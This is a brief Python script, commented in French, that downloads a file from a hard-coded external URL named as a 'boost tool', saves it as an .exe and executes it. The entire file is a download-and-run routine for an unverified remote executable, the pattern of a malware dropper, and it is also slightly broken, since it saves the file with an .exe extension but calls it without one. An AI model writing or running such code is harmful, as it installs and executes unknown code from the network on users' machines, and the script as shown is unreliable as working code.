import requests
import subprocess

def download_and_run(url):
    # Téléchargement du fichier
    response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(f"{file_name}.exe", "wb") as file:
        file.write(response.content)

    # Exécution du fichier .exe
    subprocess.call([file_name])
# URL du fichier .exe à télécharger
url = "http://lestudio.semirprod.com/ls-boost-tool"

# Appel de la fonction pour télécharger et exécuter le fichier
download_and_run(url)